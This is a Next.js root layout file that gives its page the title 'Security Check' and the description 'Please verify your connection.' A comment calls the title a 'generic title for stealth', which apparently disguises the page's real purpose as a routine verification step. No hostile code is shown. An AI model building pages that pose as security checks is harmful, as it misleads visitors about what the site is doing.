import type { Metadata, Viewport } from "next";
import "./globals.css";
import DataLayerInitializer from "../components/DataLayerInitializer";

export const metadata: Metadata = {
  title: "Security Check", // Generic title for stealth
  description: "Please verify your connection.",
  icons: {
    icon: '/favicon.ico',
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body>
        <DataLayerInitializer />
        {children}
      </body>
    </html>
  );
}
